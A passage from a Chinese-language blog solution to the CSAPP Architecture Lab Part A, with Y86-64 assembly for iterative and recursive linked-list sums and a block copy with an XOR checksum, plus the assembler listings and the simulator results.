class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="type">long</span> val = ls-&gt;val;</span><br><span class="line">	<span class="type">long</span> rest = rsum_list(ls-&gt;next);</span><br><span class="line">	<span class="keyword">return</span> val + rest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy_block - Copy src to dest and return xor checksum of src */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">copy_block</span><span class="params">(<span class="type">long</span> *src, <span class="type">long</span> *dest, <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="type">long</span> val = *src++;</span><br><span class="line">	*dest++ = val;</span><br><span class="line">	result ^= val;</span><br><span class="line">	len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end examples */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>讲义中的一些说明<ul>
<li>您可以通过首先使用程序 YAS 组装程序，然后使用指令集模拟器 YIS 运行它们来测试程序</li>
<li>在所有 Y86-64 函数中，您应遵循 x86-64 约定来传递函数参数、使用寄存器和使用堆栈。这包括保存和恢复您使用的任何被调用方保存寄存器</li>
</ul>
</li>
</ul>
<h1 id="sum-ys"><a href="#sum-ys" class="headerlink" title="sum.ys"></a>sum.ys</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sum_list - Sum the elements of a linked list */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">sum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ls) &#123;</span><br><span class="line">	val += ls-&gt;val;</span><br><span class="line">	ls = ls-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编写一个 Y86-64 程序 sum.ys，以迭代方式对链表的元素求和</li>
<li>讲义中的一些说明<ul>
<li>您的程序应该包含一些代码，这些代码设置堆栈结构，调用函数，然后停止</li>
<li>使用以下三个元素链表测试程序</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Sample linked list</span><br><span class="line">	.align 8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a</span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00</span><br><span class="line">	.quad 0</span><br></pre></td></tr></table></figure>

<ul>
<li><p>根据讲义中的说明，我们的用 Y86-64 汇编代码编写的程序应该是一个完整的程序，包括栈的放置、数据初始化、程序初始化和程序结束等问题</p>
<blockquote>
<p>完整的 Y86-64 程序例子详见 CSAPP p252</p>
</blockquote>
</li>
<li><p>分析一下链表的结构</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* $begin examples */</span></span><br><span class="line"><span class="comment">/* linked list element */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; *list_ptr;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>链表的一个结点有 16 个字节，前 8 个字节存储 val，后 8 个字节存储 next，所以可以通过 **%rdi &#x3D; <em>(%rdi + 8)</em>* 得到下一个结点的起始地址实现遍历</p>
</li>
<li><p>sum.ys 的汇编代码如下</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># 执行开始于地址 0</span><br><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp	# 设置栈指针</span><br><span class="line">	call main 			# 执行 main 程序</span><br><span class="line">	halt				# 终止程序</span><br><span class="line">	</span><br><span class="line"># 要执行的链表</span><br><span class="line">	.align 8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a			# 结点中存储的值</span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00</span><br><span class="line">	.quad 0</span><br><span class="line">	</span><br><span class="line">main:</span><br><span class="line">	irmovq ele1,%rdi	# %rdi = ele1</span><br><span class="line">	call sum			# 调用 sum</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line"># 对链表元素求和	</span><br><span class="line">sum:</span><br><span class="line">	xorq %rax,%rax		# %rax = 0</span><br><span class="line">	andq %rdi,%rdi		# 测试 %rdi 是否为 null</span><br><span class="line">	jmp test			# 直接跳转到 test</span><br><span class="line">loop:</span><br><span class="line">	mrmovq (%rdi),%r8	# %r8 = *(%rdi) 取出结点中存储的值</span><br><span class="line">	addq %r8,%rax		# %rax += %r8</span><br><span class="line">	mrmovq 8(%rdi),%rdi	# %rdi = *(%rdi + 8) 取出并赋值为下个结点的起始地址</span><br><span class="line">	andq %rdi,%rdi		# 测试 %rdi 是否为 null</span><br><span class="line">test:</span><br><span class="line">	jne loop			# 如果链表结点不为为空，跳转到 loop</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">	.pos 0x200			# 栈的起始地址，向上增长</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li><p>创建一个 sum.ys 文件，写入上述汇编代码</p>
</li>
<li><p>通过命令  <strong>.&#x2F;yas sum.ys</strong> 得到 sum.yo 文件，汇编结果如下</p>
<blockquote>
<p>YAS 是 Y86-64 代码的汇编器</p>
</blockquote>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">                            | # 执行开始于地址 0</span><br><span class="line">0x000:                      | 	.pos 0</span><br><span class="line">0x000: 30f40002000000000000 | 	irmovq stack, %rsp	# 设置栈指针</span><br><span class="line">0x00a: 804800000000000000   | 	call main 		# 执行 main 程序</span><br><span class="line">0x013: 00                   | 	halt			# 终止程序</span><br><span class="line">                            | 	</span><br><span class="line">                            | # 要执行的链表</span><br><span class="line">0x018:                      | 	.align 8</span><br><span class="line">0x018:                      | ele1:</span><br><span class="line">0x018: 0a00000000000000     | 	.quad 0x00a</span><br><span class="line">0x020: 2800000000000000     | 	.quad ele2</span><br><span class="line">0x028:                      | ele2:</span><br><span class="line">0x028: b000000000000000     | 	.quad 0x0b0</span><br><span class="line">0x030: 3800000000000000     | 	.quad ele3</span><br><span class="line">0x038:                      | ele3:</span><br><span class="line">0x038: 000c000000000000     | 	.quad 0xc00</span><br><span class="line">0x040: 0000000000000000     | 	.quad 0</span><br><span class="line">                            | 	</span><br><span class="line">0x048:                      | main:</span><br><span class="line">0x048: 30f71800000000000000 | 	irmovq ele1,%rdi	# 将链表的起始地址放入 %rdi 作为参数</span><br><span class="line">0x052: 805c00000000000000   | 	call sum		# 调用 sum</span><br><span class="line">0x05b: 90                   | 	ret</span><br><span class="line">                            | </span><br><span class="line">                            | # 对链表元素求和	</span><br><span class="line">0x05c:                      | sum:</span><br><span class="line">0x05c: 6300                 | 	xorq %rax,%rax</span><br><span class="line">0x05e: 6277                 | 	andq %rdi,%rdi</span><br><span class="line">0x060: 708100000000000000   | 	jmp test</span><br><span class="line">0x069:                      | loop:</span><br><span class="line">0x069: 50870000000000000000 | 	mrmovq (%rdi),%r8</span><br><span class="line">0x073: 6080                 | 	addq %r8,%rax</span><br><span class="line">0x075: 50770800000000000000 | 	mrmovq 8(%rdi),%rdi</span><br><span class="line">0x07f: 6277                 | 	andq %rdi,%rdi</span><br><span class="line">0x081:                      | test:</span><br><span class="line">0x081: 746900000000000000   | 	jne loop	# 如果链表结点为空，返回</span><br><span class="line">0x08a: 90                   | 	ret</span><br><span class="line">                            | 	</span><br><span class="line">                            | </span><br><span class="line">0x200:                      | 	.pos 0x200</span><br><span class="line">0x200:                      | stack:</span><br></pre></td></tr></table></figure>

<ul>
<li><p>通过命令 <strong>.&#x2F;yis sum.yo</strong> 运行程序</p>
<blockquote>
<p>YIS 是一个指令集模拟器，它的目的是模拟 Y86-64 机器代码程序的执行，而不用试图去模拟任何具体处理器实现的行为</p>
</blockquote>
</li>
</ul>
<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><ul>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240316161337114.png" class="" title="image-20240316161337114">

<ul>
<li>返回值 %rax &#x3D;&#x3D; 0x000a + 0x00b0 + 0x0c00 &#x3D; 0x0cba，结果正确</li>
</ul>
<h1 id="rsum-ys"><a href="#rsum-ys" class="headerlink" title="rsum.ys"></a>rsum.ys</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* rsum_list - Recursive version of sum_list */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">rsum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ls)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="type">long</span> val = ls-&gt;val;</span><br><span class="line">	<span class="type">long</span> rest = rsum_list(ls-&gt;next);</span><br><span class="line">	<span class="keyword">return</span> val + rest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>编写一个 Y86-64 程序 rsum.ys，它以递归方式对链表的元素求和</p>
</li>
<li><p>讲义中的一些说明</p>
<ul>
<li>此代码应与 sum.ys 中的代码类似，不同之处在于它应该使用一个函数 rsum_list</li>
<li>该函数对数字链表进行递归求和，使用相同的三元素链表测试程序</li>
</ul>
</li>
<li><p>rsum.ys 的汇编代码如下</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">	.pos 0</span><br><span class="line">	irmovq stack,%rsp	# 设置栈指针</span><br><span class="line">	call main			# 执行 main 程序</span><br><span class="line">	halt				# 终止程序</span><br><span class="line"></span><br><span class="line"># 链表</span><br><span class="line">	.align8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a		</span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00</span><br><span class="line">	.quad 0</span><br><span class="line">	</span><br><span class="line">main:</span><br><span class="line">	irmovq ele1,%rdi	# %rdi = ele1，设置参数</span><br><span class="line">	call rsum_list		# 调用 rsum_list</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">rsum_list:</span><br><span class="line">	xorq %rax,%rax		# %rax = 0</span><br><span class="line">	jmp test			# 直接跳转到 test</span><br><span class="line">loop:</span><br><span class="line">	mrmovq (%rdi),%r8	# %r8 = *(%rdi) 取出结点存储的值</span><br><span class="line">	mrmovq 8(%rdi),%rdi	# %rdi = *(%rdi + 8) 取出下一个结点的起始地址</span><br><span class="line">	pushq %r8			# 将 %r8 入栈</span><br><span class="line">	call rsum_list		# 调用 rsum_list，相当于 rsum_list(ls-&gt;next)</span><br><span class="line">	popq %r8			# 将 %r8 出栈</span><br><span class="line">	addq %r8,%rax		# %rax += %r8</span><br><span class="line">	ret</span><br><span class="line">test:</span><br><span class="line">	andq %rdi,%rdi		# 测试链表是否为 null</span><br><span class="line">	jne loop			# 如果不为 null，跳转到 loop</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">	.pos 0x200			# 栈的起始地址，向上增长</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<ul>
<li>pushq %r8 是必须的，否则 %r8 会变得不确定</li>
</ul>
<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>创建 rsum_list 文件，写入上述汇编代码</li>
<li>通过命令 <strong>.&#x2F;yas rsum.ys</strong> 得到 rsum.yo 文件，汇编结果如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0x000:                      | 	.pos 0</span><br><span class="line">0x000: 30f40002000000000000 | 	irmovq stack,%rsp	# 设置栈指针</span><br><span class="line">0x00a: 804800000000000000   | 	call main		# 执行 main 程序</span><br><span class="line">0x013: 00                   | 	halt			# 终止程序</span><br><span class="line">                            | </span><br><span class="line">                            | # 链表</span><br><span class="line">0x018:                      | 	.align8</span><br><span class="line">0x018:                      | ele1:</span><br><span class="line">0x018: 0a00000000000000     | 	.quad 0x00a</span><br><span class="line">0x020: 2800000000000000     | 	.quad ele2</span><br><span class="line">0x028:                      | ele2:</span><br><span class="line">0x028: b000000000000000     | 	.quad 0x0b0</span><br><span class="line">0x030: 3800000000000000     | 	.quad ele3</span><br><span class="line">0x038:                      | ele3:</span><br><span class="line">0x038: 000c000000000000     | 	.quad 0xc00</span><br><span class="line">0x040: 0000000000000000     | 	.quad 0</span><br><span class="line">                            | 	</span><br><span class="line">0x048:                      | main:</span><br><span class="line">0x048: 30f71800000000000000 | 	irmovq ele1,%rdi</span><br><span class="line">0x052: 805c00000000000000   | 	call rsum_list</span><br><span class="line">0x05b: 90                   | 	ret</span><br><span class="line">                            | 	</span><br><span class="line">0x05c:                      | rsum_list:</span><br><span class="line">0x05c: 6300                 | 	xorq %rax,%rax</span><br><span class="line">0x05e: 708b00000000000000   | 	jmp test</span><br><span class="line">0x067:                      | loop:</span><br><span class="line">0x067: 50870000000000000000 | 	mrmovq (%rdi),%r8</span><br><span class="line">0x071: 50770800000000000000 | 	mrmovq 8(%rdi),%rdi</span><br><span class="line">0x07b: a08f                 | 	pushq %r8</span><br><span class="line">0x07d: 805c00000000000000   | 	call rsum_list</span><br><span class="line">0x086: b08f                 | 	popq %r8</span><br><span class="line">0x088: 6080                 | 	addq %r8,%rax</span><br><span class="line">0x08a: 90                   | 	ret</span><br><span class="line">0x08b:                      | test:</span><br><span class="line">0x08b: 6277                 | 	andq %rdi,%rdi</span><br><span class="line">0x08d: 746700000000000000   | 	jne loop</span><br><span class="line">0x096: 90                   | 	ret</span><br><span class="line">                            | 	</span><br><span class="line">0x200:                      | 	.pos 0x200</span><br><span class="line">0x200:                      | stack:</span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>.&#x2F;yis rsum.yo</strong> 运行程序</li>
</ul>
<h2 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h2><ul>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240316164804172.png" class="" title="image-20240316164804172">

<ul>
<li>%rax &#x3D;&#x3D; 0x0cba，结果正确</li>
</ul>
<h1 id="copy-ys"><a href="#copy-ys" class="headerlink" title="copy.ys"></a>copy.ys</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* copy_block - Copy src to dest and return xor checksum of src */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">copy_block</span><span class="params">(<span class="type">long</span> *src, <span class="type">long</span> *dest, <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="type">long</span> val = *src++;</span><br><span class="line">	*dest++ = val;</span><br><span class="line">	result ^= val;</span><br><span class="line">	len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end examples */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>编写一个程序 copy.ys，将单词块从内存的一部分复制到内存的另一部分（非重叠区域），计算所有复制单词的校验和 （Xor）</li>
<li>讲义中的一些说明<ul>
<li>程序应包含设置堆栈帧、调用函数复制块然后停止的代码</li>
<li>使用以下三元素源块和目标块测试程序</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">	.align 8</span><br><span class="line"># Source block</span><br><span class="line">src:</span><br><span class="line">	.quad 0x00a</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad 0xc00</span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">	.quad 0x111</span><br><span class="line">	.quad 0x222</span><br><span class="line">	.quad 0x333</span><br></pre></td></tr></table></figure>

<ul>
<li>我们可以知道 src 和 dest 为 long 的数组</li>
<li>copy.ys 的汇编代码如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">	.pos 0</span><br><span class="line">	irmovq stack,%rsp</span><br><span class="line">	call main</span><br><span class="line">	halt</span><br><span class="line">	</span><br><span class="line">	.align 8</span><br><span class="line"># Source block</span><br><span class="line">src:</span><br><span class="line">	.quad 0x00a</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad 0xc00</span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">	.quad 0x111</span><br><span class="line">	.quad 0x222</span><br><span class="line">	.quad 0x333</span><br><span class="line">	</span><br><span class="line">main:</span><br><span class="line">	irmovq src,%rdi		# %rdi = src</span><br><span class="line">	irmovq dest,%rsi	# %rsi = dest</span><br><span class="line">	irmovq $3,%rdx		# %rdx = 3</span><br><span class="line">	call copy_block		# 调用 copy_block</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">copy_block:</span><br><span class="line">	xorq %rax,%rax		# %rax = 0</span><br><span class="line">	irmovq $8,%r8		# %r8 = 8</span><br><span class="line">	irmovq $1,%r9		# %r9 = 1</span><br><span class="line">	andq %rdx,%rdx		# 测试 %rdx 是否大于 0</span><br><span class="line">	jmp test			# 直接跳转到 test</span><br><span class="line">	</span><br><span class="line">loop:</span><br><span class="line">	mrmovq (%rdi),%rbx	# %rbx = *(%rdi)</span><br><span class="line">	addq %r8,%rdi		# %rdi += 8</span><br><span class="line">	rmmovq %rbx,(%rsi)	# *(%rsi) = %rbx</span><br><span class="line">	addq %r8,%rsi		# %rsi += 8</span><br><span class="line">	xorq %rbx,%rax		# %rax ^= %rbx</span><br><span class="line">	subq %r9,%rdx		# %rbx -= 1</span><br><span class="line">test:</span><br><span class="line">	jg loop				# 如果 %rdx 大于 0，跳转到 loop</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>创建 copy.ys 文件，写入上述汇编代码</li>
<li>通过命令 <strong>.&#x2F;yas copy.ys</strong> 得到 copy.yo 文件，汇编结果如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">0x000:                      | 	.pos 0</span><br><span class="line">0x000: 30f40002000000000000 | 	irmovq stack,%rsp</span><br><span class="line">0x00a: 804800000000000000   | 	call main</span><br><span class="line">0x013: 00                   | 	halt</span><br><span class="line">                            | 	</span><br><span class="line">0x018:                      | 	.align 8</span><br><span class="line">                            | # Source block</span><br><span class="line">0x018:                      | src:</span><br><span class="line">0x018: 0a00000000000000     | 	.quad 0x00a</span><br><span class="line">0x020: b000000000000000     | 	.quad 0x0b0</span><br><span class="line">0x028: 000c000000000000     | 	.quad 0xc00</span><br><span class="line">                            | # Destination block</span><br><span class="line">0x030:                      | dest:</span><br><span class="line">0x030: 1101000000000000     | 	.quad 0x111</span><br><span class="line">0x038: 2202000000000000     | 	.quad 0x222</span><br><span class="line">0x040: 3303000000000000     | 	.quad 0x333</span><br><span class="line">                            | 	</span><br><span class="line">0x048:                      | main:</span><br><span class="line">0x048: 30f71800000000000000 | 	irmovq src,%rdi	# %rdi = src</span><br><span class="line">0x052: 30f63000000000000000 | 	irmovq dest,%rsi	# %rsi = dest</span><br><span class="line">0x05c: 30f20300000000000000 | 	irmovq $3,%rdx		# %rdx = 3</span><br><span class="line">0x066: 807000000000000000   | 	call copy_block	# 调用 copy_block</span><br><span class="line">0x06f: 90                   | 	ret</span><br><span class="line">                            | 	</span><br><span class="line">0x070:                      | copy_block:</span><br><span class="line">0x070: 6300                 | 	xorq %rax,%rax		# %rax = 0</span><br><span class="line">0x072: 30f80800000000000000 | 	irmovq $8,%r8		# %r8 = 8</span><br><span class="line">0x07c: 30f90100000000000000 | 	irmovq $1,%r9		# %r9 = 1</span><br><span class="line">0x086: 6222                 | 	andq %rdx,%rdx		# 测试 %rdx 是否大于 0</span><br><span class="line">0x088: 70ad00000000000000   | 	jmp test		# 直接跳转到 test</span><br><span class="line">                            | 	</span><br><span class="line">0x091:                      | loop:</span><br><span class="line">0x091: 50370000000000000000 | 	mrmovq (%rdi),%rbx	# %rbx = *(%rdi)</span><br><span class="line">0x09b: 6087                 | 	addq %r8,%rdi		# %rdi += 8</span><br><span class="line">0x09d: 40360000000000000000 | 	rmmovq %rbx,(%rsi)	# *(%rsi) = %rbx</span><br><span class="line">0x0a7: 6086                 | 	addq %r8,%rsi		# %rsi += 8</span><br><span class="line">0x0a9: 6330                 | 	xorq %rbx,%rax		# %rax ^= %rbx</span><br><span class="line">0x0ab: 6192                 | 	subq %r9,%rdx		# %rbx -= 1</span><br><span class="line">0x0ad:                      | test:</span><br><span class="line">0x0ad: 769100000000000000   | 	jg loop		# 如果 %rdx 大于 0，跳转到 loop</span><br><span class="line">0x0b6: 90                   | 	ret</span><br><span class="line">                            | </span><br><span class="line">0x200:                      | 	.pos 0x200</span><br><span class="line">0x200:                      | stack:</span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>.&#x2F;yis copy.yo</strong> 运行程序</li>
</ul>
<h2 id="Result-2"><a href="#Result-2" class="headerlink" title="Result"></a>Result</h2><ul>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240316171806273.png" class="" title="image-20240316171806273">

<ul>
<li>%rax &#x3D;&#x3D; 0x0cba，结果正确</li>
</ul>
<h1 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h1><ul>
<li>在这一部分中，您将在目录 <strong>sim&#x2F;seq</strong> 中工作</li>
